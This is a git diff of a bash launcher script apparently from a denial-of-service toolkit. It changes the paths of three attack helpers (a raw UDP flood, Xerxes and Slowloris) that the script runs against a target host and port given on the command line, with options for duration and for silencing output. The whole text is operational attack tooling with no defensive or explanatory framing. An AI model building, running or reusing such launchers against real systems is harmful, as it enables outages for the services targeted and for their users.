@@ -75,13 +75,13 @@ if [ $1 == 'rawudp' ]
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
 		if [ -z $6 ]
 			then
-				perl u $2 $3 $5 $4
+				perl inc/u $2 $3 $5 $4
 		elif [ $6 -eq 0 ]
 			then	
-				perl u $2 $3 $5 $4
+				perl inc/u $2 $3 $5 $4
 		elif [ $6 -eq 1 ]
 			then
-				perl u $2 $3 $5 $4 > /dev/null 2>&1
+				perl inc/u $2 $3 $5 $4 > /dev/null 2>&1
 		else
 			exit
 		fi
@@ -107,13 +107,13 @@ if [ $1 == 'xerxes' ]
 		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
 		if [ -z $5 ]
 			then
-				timeout $4 ./x $2 $3
+				timeout $4 inc/x $2 $3
 		elif [ $5 -eq 0 ]
 			then	
-				timeout $4 ./x $2 $3
+				timeout $4 inc/x $2 $3
 		elif [ $5 -eq 1 ]
 			then
-				timeout $4 ./x $2 $3 > /dev/null 2>&1
+				timeout $4 inc/x $2 $3 > /dev/null 2>&1
 		else
 			exit
 		fi
@@ -146,26 +146,26 @@ if [ $1 == 'slowloris' ]
 			then
 				if [ -z $6 ]
 					then	
-						timeout $4 perl s -dns $2 -port $3 -https
+						timeout $4 perl inc/s -dns $2 -port $3 -https
 				elif [ $6 -eq 0 ]
 					then
-						timeout $4 perl s -dns $2 -port $3 -https
+						timeout $4 perl inc/s -dns $2 -port $3 -https
 				elif [ $6 -eq 1 ]
 					then
-						timeout $4 perl s -dns $2 -port $3 -https > /dev/null 2>&1
+						timeout $4 perl inc/s -dns $2 -port $3 -https > /dev/null 2>&1
 				else
 					exit
 				fi
 		else
 			if [ -z $6 ]
 				then	
-					timeout $4 perl s -dns $2 -port $3
+					timeout $4 perl inc/s -dns $2 -port $3
 			elif [ $6 -eq 0 ]
 				then
-					timeout $4 perl s -dns $2 -port $3
+					timeout $4 perl inc/s -dns $2 -port $3
 			elif [ $6 -eq 1 ]
 				then
-					timeout $4 perl s -dns $2 -port $3 > /dev/null 2>&1
+					timeout $4 perl inc/s -dns $2 -port $3 > /dev/null 2>&1
 			else
 				echo "please put 0 or 1 (0=no, 1=yes), defaulting to 0"
 				exit
